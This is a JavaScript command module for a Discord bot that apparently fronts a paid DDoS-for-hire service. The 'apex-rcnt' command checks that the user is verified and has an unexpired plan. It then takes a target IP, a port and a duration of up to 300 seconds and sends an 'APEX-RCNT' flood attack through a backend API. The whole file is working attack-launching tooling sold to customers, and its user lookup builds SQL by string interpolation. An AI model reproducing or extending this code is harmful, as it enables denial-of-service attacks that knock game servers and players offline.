const { MessageEmbed } = require('discord.js');
const Util = require('../../Util/index');
const util = new Util.default;
module.exports = {
  name: 'apex-rcnt',
  category: '🎮 | Game Methods',
  description: 'start an APEX-RCNT attack',

  /**
   * @param {Client} client
   * @param {Message} message
   * @param {String[]} args
   */

  run: async (client, message, args, pool) => {

    /* getting the connection from the db made in sql by dread modified by cykotic */
    pool.getConnection((err, connection) => {
      if (err) throw err;

      /* @ the user */
      var target = message.author;

      /* grabing the user id from the bot */
      connection.query(`select * from users where discordid='${target.id}'`, async (err, rows) => {
        if (err) throw err;

        var verified = rows[0].discordverified;

        /* check if the user has been verified */
        if (verified === 0) return message.reply(new MessageEmbed()
          .setColor(0xff1100)
          .setTimestamp()
          .setFooter(message.author.tag, message.member.user.displayAvatarURL())
          .setTitle("❌ Error | you have not verified your Discord account with the bot!")
        ).then(msg => msg.delete({ timeout: 10000 }).catch(e => console.log(e.message)))

        /* checks if the plans is expires */
        var expires = new Date(rows[0].expires);
        var today = new Date();
        var expired = (expires <= today);

        /* checks if the user has a active ban if not then return trued */
        if (expired === true) return message.reply(new MessageEmbed()
          .setColor(0xff1100)
          .setTimestamp()
          .setFooter(message.author.tag, message.member.user.displayAvatarURL())
          .setTitle("❌ Error | you do not have an active plan, purchase one and try again!")
        ).then(msg => msg.delete({ timeout: 10000 }).catch(e => console.log(e.message)))

        const address = args[0];
        const port = args[1];
        const time = args[2];

        /* checks must be correct formatt */
        if (!address || !port || !time) return message.channel.send(new MessageEmbed()
          .setTitle("❌ Error | \`Correct Usage: [IP] [PORT] [TIME]\`")
          .setColor(0xff1100)
          .setTimestamp()
          .setFooter(message.author.tag, message.member.user.displayAvatarURL())
        ).then(msg => msg.delete({ timeout: 10000 }).catch(e => console.log(e.message)))


        /* checking if the port is a number and not a letter */
        if (isNaN(port)) return message.channel.send(new MessageEmbed()
          .setTitle("❌ Error | **\`Port must be a number\`**")
          .setColor(0xff1100)
          .setTimestamp()
          .setFooter(message.author.tag, message.member.user.displayAvatarURL())
        ).then(msg => msg.delete({ timeout: 10000 }).catch(e => console.log(e.message)))

        /* checking if the port is a number and not a letter */
        if (isNaN(time)) return message.channel.send(new MessageEmbed()
          .setTitle("❌ Error | **\`Time must be a number\`**")
          .setColor(0xff1100)
          .setTimestamp()
          .setFooter(message.author.tag, message.member.user.displayAvatarURL())
        ).then(msg => msg.delete({ timeout: 10000 }).catch(e => console.log(e.message)))

        /* checking the max time */
        if (time < 10 || time > 300) return message.channel.send(new MessageEmbed()
          .setTitle("❌ Error | **Max Time \`[10 - 300]\` **")
          .setColor(0xff1100)
          .setTimestamp()
          .setFooter(message.author.tag, message.member.user.displayAvatarURL())
        ).then(msg => msg.delete({ timeout: 10000 }).catch(e => console.log(e.message)))

        /* checking the deletes the message after it get's sent  */
        await message.delete()

        /* sends the attack with embed */
        await util.requestAPI(address, port, time, 'APEX-RCNT');
        return message.channel.send(new MessageEmbed()
          .setThumbnail(client.user.displayAvatarURL())
          .setColor(0xff1100)
          .addField("Attack sent!", [
            `> ❯ IP: **${address}**`,
            `> ❯ Port: **${port}**`,
            `> ❯ Time: **${time}**`,
            `> ❯ Method: **APEX-RCNT**`
          ])
          .setFooter(message.author.tag, message.member.user.displayAvatarURL())
          .setTimestamp()
        )
      });
      connection.release();
    });
  }
}